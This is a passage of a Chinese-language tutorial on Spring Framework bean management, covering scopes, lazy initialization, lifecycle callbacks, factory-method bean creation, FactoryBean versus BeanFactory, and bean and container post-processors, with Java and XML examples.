&lt;li&gt;global session：只有应用在基于porlet的web应用程序中才有意义，它映射到porlet的global范围的session，如果普通的servlet的web 应用中使用了这个scope，容器会把它作为普通的session的scope对待。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;配置方式：&lt;/p&gt;
&lt;p&gt;(1) XML 文件配置：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;bean id=&quot;helloSpring&quot; class=&quot;com.sharpcj.hello.HelloSpring&quot; scope=&quot;ConfigurableBeanFactory.SCOPE_SINGLETON&quot;&amp;gt; &amp;lt;!-- singleton --&amp;gt;
    &amp;lt;property name=&quot;name&quot; value=&quot;Spring&quot;/&amp;gt;
&amp;lt;/bean&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;(2) 注解配置：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;@Component
@Scope(&quot;singleton&quot;)
public class HelloSpring {

}&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;bean-的延迟加载&quot;&gt;Bean 的延迟加载&lt;/h2&gt;
&lt;p&gt;默认情况下，当容器启动之后，会将所有作用域为单例的bean创建好，如配置 &lt;code&gt;lazy-init&lt;/code&gt;值为true,表示延迟加载，即容器启动之后，不会立即创建该实例。&lt;/p&gt;
&lt;p&gt;(1) XML文件配置：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;bean id=&quot;mb1&quot; class=&quot;com.sharpcj.hello.HelloSpring&quot; lazy-init=&quot;true&quot;&amp;gt;&amp;lt;/bean&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;(2) 注解配置:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;@Component
@Lazy
@Scope(&quot;singleton&quot;)
public class HelloSpring {

}&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;bean-初始化和销毁前后回调方法&quot;&gt;Bean 初始化和销毁前后回调方法&lt;/h2&gt;
&lt;p&gt;Bean 初始化回调和销毁回调&lt;br/&gt;HelloSpring.java&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package com.sharpcj.cycle;

import org.springframework.beans.factory.DisposableBean;
import org.springframework.beans.factory.InitializingBean;
import org.springframework.stereotype.Component;

import javax.annotation.PostConstruct;
import javax.annotation.PreDestroy;

@Component
public class HelloSpring implements InitializingBean, DisposableBean{
    public HelloSpring(){
        System.out.println(&quot;构造方法&quot;);
    }

    public void xmlInit(){
        System.out.println(&quot;xml Init&quot;);
    }

    public void xmlDestory(){
        System.out.println(&quot;xml Destory&quot;);
    }

    @PostConstruct
    public void init(){
        System.out.println(&quot;annotation Init&quot;);
    }

    @PreDestroy
    public void destory(){
        System.out.println(&quot;annotation Destory&quot;);
    }

    @Override
    public void afterPropertiesSet() throws Exception {
        System.out.println(&quot;interface afterPropertiesSet&quot;);
    }

    @Override
    public void destroy() throws Exception {
        System.out.println(&quot;interface destroy&quot;);
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;(1) XML文件配置：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;bean id=&quot;hello&quot; class=&quot;com.sharpcj.cycle.HelloSpring&quot; init-method=&quot;xmlInit&quot; destroy-method=&quot;xmlDestory&quot;/&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;(2) 注解配置：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;@PostConstruct
public void init(){
    System.out.println(&quot;annotation Init&quot;);
}

@PreDestroy
public void destory(){
    System.out.println(&quot;annotation Destory&quot;);
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;另外 Bean 可以实现 &lt;code&gt;org.springframework.beans.factory.InitializingBean&lt;/code&gt; 和 &lt;code&gt;org.springframework.beans.factory.DisposableBean&lt;/code&gt; 两个接口。&lt;br/&gt;执行结果：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;构造方法
interface afterPropertiesSet
xml Init
interface destroy
xml Destory&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;或者&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;构造方法
annotation Init
interface afterPropertiesSet
annotation Destory
interface destroy&lt;/code&gt;
&lt;/pre&gt;

&lt;p&gt;创建 Bean 有三种方式：通过调用构造方法创建 Bean, 调用实例工厂方法创建Bean，调用静态工厂方法创建 Bean。&lt;/p&gt;
&lt;h2 id=&quot;调用构造器创建-bean&quot;&gt;调用构造器创建 Bean&lt;/h2&gt;
&lt;p&gt;这是最常见的情况， 当我们通过配置文件，或者注解的方式配置 Bean， Spring 会通过调用 Bean 类的构造方法，来创建 Bean 的实例。通过 xml 文件配置，明确指定 Bean 的 class 属性，或者通过注解配置，Spring 容器知道 Bean 的完整类名，然后通过反射调用该类的构造方法即可。&lt;/p&gt;
&lt;h2 id=&quot;调用实例工厂方法创建-bean&quot;&gt;调用实例工厂方法创建 Bean&lt;/h2&gt;
&lt;p&gt;直接上代码：&lt;br/&gt;Ipet.java&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package com.sharpcj.factorytest;

public interface IPet {
    void move();
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Dog.java&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package com.sharpcj.factorytest;

public class Dog implements IPet {
    @Override
    public void move() {
        System.out.println(&quot;Dog can run!&quot;);
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Parrot.java&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package com.sharpcj.factorytest;

public class Parrot implements IPet {
    @Override
    public void move() {
        System.out.println(&quot;Parrot can fly!&quot;);
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;工厂类， PetFactory.java&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package com.sharpcj.factorytest;

public class PetFactory {
    public IPet getPet(String type){
        if (&quot;dog&quot;.equals(type)) {
            return new Dog();
        } else if (&quot;parrot&quot;.equals(type)){
            return new Parrot();
        } else {
            throw new IllegalArgumentException(&quot;pet type is illegal!&quot;);
        }
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;resources 文件夹下配置文件， factorybeantest.xml&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;
       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&amp;gt;

        &amp;lt;bean id=&quot;petFactory&quot; class=&quot;com.sharpcj.factorytest.PetFactory&quot;&amp;gt;&amp;lt;/bean&amp;gt;

        &amp;lt;bean id=&quot;dog&quot; factory-bean=&quot;petFactory&quot; factory-method=&quot;getPet&quot;&amp;gt;
            &amp;lt;constructor-arg value=&quot;dog&quot;&amp;gt;&amp;lt;/constructor-arg&amp;gt;
        &amp;lt;/bean&amp;gt;

        &amp;lt;bean id=&quot;parrot&quot; factory-bean=&quot;petFactory&quot; factory-method=&quot;getPet&quot;&amp;gt;
            &amp;lt;constructor-arg value=&quot;parrot&quot;&amp;gt;&amp;lt;/constructor-arg&amp;gt;
        &amp;lt;/bean&amp;gt;
&amp;lt;/beans&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;测试类，AppTest.java&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package com.sharpcj.factorytest;

import org.springframework.beans.factory.BeanFactory;
import org.springframework.beans.factory.support.BeanDefinitionReader;
import org.springframework.beans.factory.support.BeanDefinitionRegistry;
import org.springframework.beans.factory.support.DefaultListableBeanFactory;
import org.springframework.beans.factory.xml.XmlBeanDefinitionReader;
import org.springframework.core.io.ClassPathResource;
import org.springframework.core.io.Resource;

public class AppTest {
    public static void main(String[] args) {
        Resource resource = new ClassPathResource(&quot;factorybeantest.xml&quot;);
        BeanFactory factory = new DefaultListableBeanFactory();
        BeanDefinitionReader bdr = new XmlBeanDefinitionReader((BeanDefinitionRegistry) factory);
        bdr.loadBeanDefinitions(resource);

        Dog dog = (Dog) factory.getBean(&quot;dog&quot;);
        Parrot parrot = (Parrot) factory.getBean(&quot;parrot&quot;);
        dog.move();
        parrot.move();
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;程序结果：&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/758949/201905/758949-20190522011058512-384411964.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可以看到，程序正确执行了。注意看配置文件中，我们并没有配置 dog 和 parrot 两个 Bean 类的 &lt;code&gt;class&lt;/code&gt; 属性，而是配置了他们的 &lt;code&gt;factory-bean&lt;/code&gt; 和 &lt;code&gt;factory-method&lt;/code&gt;两个属性，这样，Spring 容器在创建 dog 和 parrot 实例时会先创建 petFactory 的实例，然后再调用其工厂方法，创建对应的 dog 和 parrot 实例。&lt;/p&gt;
&lt;p&gt;另外，假设我们在测试类中通过 factory 获取 Bean 实例时，传入一个非法的参数，会如何？ PetFactory 类工厂方法的代码,看起来会抛出我们自定义的异常？&lt;br/&gt;比如调用如下代码：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;factory.getBean(&quot;cat&quot;);&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;结果是：&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/758949/201905/758949-20190522011107439-1624099505.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;结果说明，Spring 本身就处理了参数异常，因为我们并没有在配置文件中配置中配置 name 为 “cat” 的 Bean, 所以，Spring 容器抛出了此异常，程序执行不到工厂方法里去了。&lt;/p&gt;
&lt;h2 id=&quot;调用静态工厂方法创建-bean&quot;&gt;调用静态工厂方法创建 Bean&lt;/h2&gt;
&lt;p&gt;抛开 Spring 不谈，相比实例工厂方法，其实我们平时用的更多的可能是静态工厂方法。 Spring 当然也有静态工厂方法创建 Bean 的实现。下面我们修改工厂方法为静态方法：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package com.sharpcj.staticfactorytest;

import com.sharpcj.factorytest.Dog;
import com.sharpcj.factorytest.IPet;
import com.sharpcj.factorytest.Parrot;

public class PetFactory {
    public static IPet getPet(String type){
        if (&quot;dog&quot;.equals(type)) {
            return new Dog();
        } else if (&quot;parrot&quot;.equals(type)){
            return new Parrot();
        } else {
            throw new IllegalArgumentException(&quot;pet type is illegal!&quot;);
        }
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;此时我们也应该修改配置文件，这里我们重新创建了一个配置文件， staticfactorbeantest.xml&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;
       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&amp;gt;

    &amp;lt;bean id=&quot;dog&quot; class=&quot;com.sharpcj.staticfactorytest.PetFactory&quot; factory-method=&quot;getPet&quot;&amp;gt;
        &amp;lt;constructor-arg value=&quot;dog&quot;&amp;gt;&amp;lt;/constructor-arg&amp;gt;
    &amp;lt;/bean&amp;gt;
    &amp;lt;bean id=&quot;parrot&quot; class=&quot;com.sharpcj.staticfactorytest.PetFactory&quot; factory-method=&quot;getPet&quot;&amp;gt;
        &amp;lt;constructor-arg value=&quot;parrot&quot;&amp;gt;&amp;lt;/constructor-arg&amp;gt;
    &amp;lt;/bean&amp;gt;
&amp;lt;/beans&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;测试代码：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package com.sharpcj.staticfactorytest;

import org.springframework.beans.factory.BeanFactory;
import org.springframework.beans.factory.support.BeanDefinitionReader;
import org.springframework.beans.factory.support.BeanDefinitionRegistry;
import org.springframework.beans.factory.support.DefaultListableBeanFactory;
import org.springframework.beans.factory.xml.XmlBeanDefinitionReader;
import org.springframework.core.io.ClassPathResource;
import org.springframework.core.io.Resource;

public class Apptest {
    public static void main(String[] args) {
        Resource resource = new ClassPathResource(&quot;staticfactorybeantest.xml&quot;);
        BeanFactory factory = new DefaultListableBeanFactory();
        BeanDefinitionReader bdr = new XmlBeanDefinitionReader((BeanDefinitionRegistry) factory);
        bdr.loadBeanDefinitions(resource);

        Dog dog = (Dog) factory.getBean(&quot;dog&quot;);
        Parrot parrot = (Parrot) factory.getBean(&quot;parrot&quot;);
        dog.move();
        parrot.move();
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;测试结果如下：&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/758949/201905/758949-20190522011120490-387608360.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;结果正常，这里注意配置文件，使用静态工厂方法是，配置文件中我们并没有配置 &lt;code&gt;PetFactory&lt;/code&gt;， 而在配置&lt;br/&gt;dog 和 parrot 时，我们配置的 &lt;code&gt;class&lt;/code&gt; 属性的值是工厂类的完整类名&lt;code&gt;com.sharpcj.staticfactorytest.PetFactory&lt;/code&gt;，同事配置了 &lt;code&gt;factory-method&lt;/code&gt;属性。&lt;/p&gt;
&lt;h2 id=&quot;调用实例工厂方法和调用静态工厂方法创建-bean-的异同&quot;&gt;调用实例工厂方法和调用静态工厂方法创建 Bean 的异同&lt;/h2&gt;
&lt;p&gt;调用实例工厂方法和调用静态工厂方法创建 Bean 的用法基本相似，区别如下：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;配置实例工厂方法创建 Bean,必须将实例工厂配置成 Bean 实例；而配置静态工厂方法创建 Bean,则无需配置工厂 Bean;&lt;/li&gt;
&lt;li&gt;配置实例工厂方法创建 Bean,必须使用 &lt;code&gt;factory-bvean&lt;/code&gt; 属性确定工厂 Bean; 而配置静态工厂方法创建 Bean,则使用 &lt;code&gt;class&lt;/code&gt; 属性确定静态工厂类。&lt;br/&gt;相同之处如下：&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;都需要使用 &lt;code&gt;factory-method&lt;/code&gt; 指定生产 Bean 实例的工厂方法；&lt;/li&gt;
&lt;li&gt;工厂方法如果需要参数，都使用 &lt;code&gt;&amp;lt;constructor-arg.../&amp;gt;&lt;/code&gt; 元素指定参数值；&lt;/li&gt;
&lt;li&gt;普通的设值注入，都使用 &lt;code&gt;&amp;lt;property.../&amp;gt;&lt;/code&gt;元素确定参数值。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;FactoryBean 和 BeanFactory 是两个极易混淆的概念，需要理解清楚。下面分别来明说这两个概念。&lt;/p&gt;
&lt;h2 id=&quot;factorybean&quot;&gt;FactoryBean&lt;/h2&gt;
&lt;p&gt;FactoryBean 翻译过来就是 工厂Bean 。需要说明的是，这里的 FactoryBean 和上一节提到的工厂方法创建Bean不是一个概念，切莫不要把实例工厂创建 Bean 时，配置的工厂 Bean ，和 FactoryBean 混为一谈。两者没有联系，上一节说的是标准的工厂模式，Spring 只是通过调用工厂方法来创建 Bean 的实例。&lt;br/&gt;这里的所说的 工厂 Bean 是一种特殊的 Bean 。它需要实现 &lt;code&gt;FactoryBean&lt;/code&gt; 这个接口。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;FactoryBean&lt;/code&gt; 接口提供了三个方法：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;T getObject() throws Exception;
Class&amp;lt;?&amp;gt; getObjectType();
boolean isSingleton() {return true;}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;当自定义一个类实现了&lt;code&gt;FactoryBean&lt;/code&gt;接口后，将该类部署在 Spring 容器里，再通过 Spring 容器调用 &lt;code&gt;getBean&lt;/code&gt; 方法获取到的就不是该类的实例了，而是该类实现的 &lt;code&gt;getObject&lt;/code&gt; 方法的返回值。这三个方法意义如下：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;getObject() 方法返回了该工厂Bean 生成的 java 实例。&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;getObjectType() 该方法返回该工厂Bean 生成的 java 实例的类型。&lt;/li&gt;
&lt;li&gt;isSingleton() 该方法返回该工厂Bean 生成的 java 实例是否为单例。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;下面举一个例子：&lt;br/&gt;定义一个类 StringFactoryBean.java&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package com.sharpcj.factorybeantest;

import org.springframework.beans.factory.FactoryBean;

public class StringFactoryBean implements FactoryBean&amp;lt;Object&amp;gt; {
    private String type;
    private String originStr;

    public void setType(String type) {
        this.type = type;
    }

    public void setOriginStr(String originStr) {
        this.originStr = originStr;
    }

    @Override
    public Object getObject() throws Exception {
        if(&quot;builder&quot;.equals(type) &amp;amp;&amp;amp; originStr != null){
            return new StringBuilder(originStr);
        } else if (&quot;buffer&quot;.equals(type) &amp;amp;&amp;amp; originStr != null) {
            return new StringBuffer(originStr);
        } else {
            throw new IllegalArgumentException();
        }
    }

    @Override
    public Class&amp;lt;?&amp;gt; getObjectType() {
        if(&quot;builder&quot;.equals(type)){
            return StringBuilder.class;
        } else if (&quot;buffer&quot;.equals(type)) {
            return StringBuffer.class;
        } else {
            throw new IllegalArgumentException();
        }
    }

    @Override
    public boolean isSingleton() {
        return false;
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;配置文件， factorybean.xml&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;
       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&amp;gt;

    &amp;lt;bean id=&quot;strFactoryBean&quot; class=&quot;com.sharpcj.factorybeantest.StringFactoryBean&quot;&amp;gt;
        &amp;lt;property name=&quot;type&quot; value=&quot;buffer&quot;/&amp;gt;
        &amp;lt;property name=&quot;originStr&quot; value=&quot;hello&quot;/&amp;gt;
    &amp;lt;/bean&amp;gt;

&amp;lt;/beans&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;测试类 AppTest.java&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package com.sharpcj.factorybeantest;

import org.springframework.context.ApplicationContext;
import org.springframework.context.support.ClassPathXmlApplicationContext;


public class AppTest {
    public static void main(String[] args) {

        ApplicationContext context = new ClassPathXmlApplicationContext(&quot;factorybean.xml&quot;);

        System.out.println(context.getBean(&quot;strFactoryBean&quot;));
        System.out.println(context.getBean(&quot;strFactoryBean&quot;).getClass().toString());

    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;结果如下：&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/758949/201905/758949-20190523004531748-1203603208.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;那有没有办法把获取 FactoryBean 本身的实例呢？当然可以，如下方式&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;context.getBean(&quot;&amp;amp;strFactoryBean&quot;)&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在&lt;code&gt;getBean&lt;/code&gt;方法是，在Bean id 前面增加&lt;code&gt;&amp;amp;&lt;/code&gt;符号。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package com.sharpcj.factorybeantest;

import org.springframework.context.ApplicationContext;
import org.springframework.context.support.ClassPathXmlApplicationContext;

public class AppTest {
    public static void main(String[] args) {
        ApplicationContext context = new ClassPathXmlApplicationContext(&quot;factorybean.xml&quot;);
        System.out.println(context.getBean(&quot;strFactoryBean&quot;));
        System.out.println(context.getBean(&quot;strFactoryBean&quot;).getClass().toString());
        System.out.println(context.getBean(&quot;&amp;amp;strFactoryBean&quot;).getClass().toString());
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;结果如下：&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/758949/201905/758949-20190523004539663-731357104.png&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;beanfactory&quot;&gt;BeanFactory&lt;/h2&gt;
&lt;p&gt;其实在前面的例子中，AppTest.java 类中我们已经使用过 BeanFactory 了, BeanFactory 也是一个接口。Spring 有两个核心的接口： BeanFactory 和 ApplicationContext ，其中 ApplicationContext 是 BeanFactory 的子接口，他们都可以代表 Spring 容器。Spring 容器是生成 Bean 实例的工厂，并管理容器中的 Bean 。&lt;br/&gt;BeanFactory 包含如下几个基本方法：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;boolean containsBean(String name) // 判断Spring容器中是否包含 id 为 name 的 Bean 实例
&amp;lt;T&amp;gt; getBean(Class&amp;lt;T&amp;gt; requeriedType) // 获取Spring容器中属于 requriedType 类型的、唯一的 Bean 实例。
Object getBean(String name) // 返回容器中 id 为 name 的 Bean 实例
&amp;lt;T&amp;gt; getBean(String name, Class requiredType) // 返回容器中 id 为name，并且类型为 requriedType 的Bean
Class&amp;lt;T&amp;gt; getType(String name) // 返回 id 为 name 的 Bean 实例的类型&lt;/code&gt;
&lt;/pre&gt;

&lt;p&gt;Spring 提供了两种常用的后处理使得 Spring 容器允许开发者对 Spring 容器进行扩展，分别是 Bean 后处理器和容器后处理器。&lt;/p&gt;
&lt;h2 id=&quot;bean-后处理器&quot;&gt;Bean 后处理器&lt;/h2&gt;
&lt;p&gt;Bean 后处理器是一种特殊的 Bean， 它可以对容器中的 Bean 进行后处理，对 Bean 进行额外加强。这种特殊的 Bean 不对外提供服务，它主要为容器中的目标 Bean 进行扩展，例如为目标 Bean 生成代理等。&lt;/p&gt;
&lt;p&gt;Bean 后处理器需要实现 BeanPostProcessor 接口，该接口包含如下两个方法：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;Object postProcessBeforeInitialization(Object bean, String beanName)
Object postProcessAfterInitialization(Object bean, String beanName)&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这两个方法的第一个参数都表示即将进行后处理的 Bean 实例，第二个参数是该 Bean 的配置 id ，这两个方法会在目标 Bean 初始化之前和初始化之后分别回调。&lt;/p&gt;
&lt;p&gt;看例子：&lt;br/&gt;新建一个类，PetBeanPostProcessor.java 重写上述两个方法。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package com.sharpcj.beanpostprocessor;

import org.springframework.beans.BeansException;
import org.springframework.beans.factory.config.BeanPostProcessor;

public class PetBeanPostProcessor implements BeanPostProcessor {
    @Override
    public Object postProcessBeforeInitialization(Object bean, String beanName) throws BeansException {
        if (&quot;dog&quot;.equals(beanName)) {
            System.out.println(&quot;准备初始化 dog ...&quot;);
        }
        return bean;
    }

    @Override
    public Object postProcessAfterInitialization(Object bean, String beanName) throws BeansException {
        if (&quot;parrot&quot;.equals(beanName)) {
            System.out.println(&quot;parrot 初始化完成 ... &quot;);
        }
        return bean;
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;配置文件, beanpostprocessor.xml：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;
       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&amp;gt;
    &amp;lt;bean id=&quot;dog&quot; class=&quot;com.sharpcj.beanpostprocessor.Dog&quot;/&amp;gt;
    &amp;lt;bean id=&quot;parrot&quot; class=&quot;com.sharpcj.beanpostprocessor.Parrot&quot;/&amp;gt;
    &amp;lt;bean class=&quot;com.sharpcj.beanpostprocessor.PetBeanPostProcessor&quot;/&amp;gt;
&amp;lt;/beans&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;最后看测试代码：AppTest.java&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package com.sharpcj.beanpostprocessor;

import org.springframework.context.ApplicationContext;
import org.springframework.context.support.ClassPathXmlApplicationContext;

public class AppTest {
    public static void main(String[] args) {
        ApplicationContext context = new ClassPathXmlApplicationContext(&quot;beanpostprocessor.xml&quot;);
        Dog dog = (Dog) context.getBean(&quot;dog&quot;);
        Parrot parrot = (Parrot) context.getBean(&quot;parrot&quot;);
        dog.move();
        parrot.move();
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;执行结果如下：&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/758949/201905/758949-20190523003851314-807121791.png&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;9&quot;&gt;
&lt;p&gt;可以看到，我们像配置其它 Bean 一样配置该 Bean 后处理器,但是我们没有配置 id ，这是因为我们使用的 ApplicationContext 作为 Spring 容器，Spring 容器会自动检测容器中所有的 Bean ，如果发现某个 Bean 实现了 BeanPostProcessor 接口，ApplicationContext 就会自动将其注册为 Bean 后处理器。 如果使用 BeanFactory 作为 Spring 的容器，则需手动注册 Bean 后处理器。这时，需要在配置文件中为 Bean 后处理器指定 id 属性，这样容器可以先获取到 Bean 后处理器的对象，然后注册它。如下：&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;配置文件：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;
       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&amp;gt;
    &amp;lt;bean id=&quot;dog&quot; class=&quot;com.sharpcj.beanpostprocessor.Dog&quot;/&amp;gt;
    &amp;lt;bean id=&quot;parrot&quot; class=&quot;com.sharpcj.beanpostprocessor.Parrot&quot;/&amp;gt;
    &amp;lt;bean id=&quot;petBeanPostProcessor&quot; class=&quot;com.sharpcj.beanpostprocessor.PetBeanPostProcessor&quot;/&amp;gt;
&amp;lt;/beans&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;测试代码：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;Resource resource = new ClassPathResource(&quot;beanpostprocessor.xml&quot;);
DefaultListableBeanFactory beanFactory = new DefaultListableBeanFactory();
new XmlBeanDefinitionReader(beanFactory).loadBeanDefinitions(resource);

PetBeanPostProcessor petBeanPostProcessor = (PetBeanPostProcessor) beanFactory.getBean(&quot;petBeanPostProcessor&quot;);
beanFactory.addBeanPostProcessor(petBeanPostProcessor);

Dog dog = (Dog) beanFactory.getBean(&quot;dog&quot;);
Parrot parrot = (Parrot) beanFactory.getBean(&quot;parrot&quot;);
dog.move();
parrot.move();&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上面例子中我们只是在实例化 Bean 前后打印了两行 Log ， 那么实际开发中 Bean 后处理有什么用处呢？其实 Bean 后处理器的作用很明显，相当于一个拦截器，对目标 Bean 进行增强，在目标 Bean 的基础上生成新的 Bean。 若我们需要对容器中某一批 Bean 进行增强处理，则可以考虑使用 Bean 后处理器，结合前面一篇文章讲到到代理模式，可以想到，我们完全可以通过 Bean 后处理器结合代理模式做更多实际工作，比如初始化，深圳完全改变容器中一个或者一批 Bean 的行为。&lt;br/&gt;你可以配置多个 BeanPostProcessor 接口，通过设置 BeanPostProcessor 实现的 Ordered 接口提供的 order 属性来控制这些 BeanPostProcessor 接口的执行顺序。&lt;/p&gt;
&lt;h2 id=&quot;容器后处理器&quot;&gt;容器后处理器&lt;/h2&gt;
&lt;p&gt;容器后处理器则是对容器本身进行处理。容器后处理器需要实现 BeanFactoryPostProcessor 接口。该接口必须实现如下一个方法：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;postProcessBeanFactory(ConfigurableListableBeanFactory beanFactory)&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;类似于 BeanPostProcessor , ApplicationContext 可以自动检测到容器中的容器后处理器，并自动注册，若使用 BeanFactory 作为 Spring 容器，则需要手动获取到该容器后处理器的对象来处理该 BeanFactory 容器。&lt;br/&gt;例子：容器后处理器， PetBeanFactoryPostProcessor.java&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package com.sharpcj.beanfactorypostprocessor;

import org.springframework.beans.BeansException;
import org.springframework.beans.factory.config.BeanFactoryPostProcessor;
import org.springframework.beans.factory.config.ConfigurableListableBeanFactory;

public class PetBeanFactoryPostProcessor implements BeanFactoryPostProcessor {
    @Override
    public void postProcessBeanFactory(ConfigurableListableBeanFactory beanFactory) throws BeansException {
        System.out.println(&quot;容器后处理器没有对容器做改变...&quot;);
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;配置文件：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;
       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&amp;gt;
